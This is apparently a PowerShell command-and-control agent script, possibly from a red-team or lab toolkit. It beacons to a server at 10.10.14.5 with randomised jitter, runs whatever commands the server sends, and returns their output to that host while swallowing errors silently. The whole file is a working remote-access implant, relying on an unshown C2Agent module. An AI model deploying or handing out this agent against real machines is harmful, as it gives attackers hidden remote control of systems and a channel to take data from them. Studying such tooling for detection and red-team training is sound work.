param(
    [string]$ServerURL = "https://10.10.14.5:443",
    [string]$AuthToken = "your-auth-token-here",
    [int]$BeaconInterval = 60,
    [int]$Jitter = 30
)

# Import the module
Import-Module -Name ./C2Agent.psm1

# Main beacon loop
function Start-Agent {
    param(
        [string]$ServerURL,
        [string]$AuthToken,
        [int]$BeaconInterval,
        [int]$Jitter
    )
    
    $encryptionKey = Get-EncryptionKey
    $sessionID = $null
    
    Write-Host "[*] Agent starting..."
    Write-Host "[*] Server: $ServerURL"
    Write-Host "[*] Beacon Interval: $BeaconInterval seconds (± $Jitter seconds jitter)"
    
    while ($true) {
        try {
            # Send beacon
            $response = Send-Beacon -ServerURL $ServerURL -AuthToken $AuthToken -SessionID $sessionID -EncryptionKey $encryptionKey
            
            if ($response) {
                # Store session ID if new
                if (-not $sessionID) {
                    $sessionID = $response.session_id
                    Write-Host "[+] Session established: $sessionID"
                }
                
                # Process tasks
                if ($response.tasks) {
                    foreach ($task in $response.tasks) {
                        Write-Host "[*] Executing task: $($task.task_id)"
                        
                        # Execute command
                        $output = Invoke-CommandLocal -Command $task.command
                        
                        # Submit results
                        $success = Submit-Results -ServerURL $ServerURL -AuthToken $AuthToken -SessionID $sessionID `
                                                  -TaskID $task.task_id -Output $output -EncryptionKey $encryptionKey
                        
                        if ($success) {
                            Write-Host "[+] Results submitted"
                        }
                    }
                }
            }
            
            # Calculate next beacon time with jitter
            $jitterAmount = Get-Random -Minimum (-$Jitter) -Maximum $Jitter
            $sleepTime = $BeaconInterval + $jitterAmount
            
            if ($sleepTime -lt 0) { $sleepTime = 1 }
            
            Start-Sleep -Seconds $sleepTime
        }
        catch {
            # Silent failure
            Start-Sleep -Seconds 60
        }
    }
}

# Start the agent
Start-Agent -ServerURL $ServerURL -AuthToken $AuthToken -BeaconInterval $BeaconInterval -Jitter $Jitter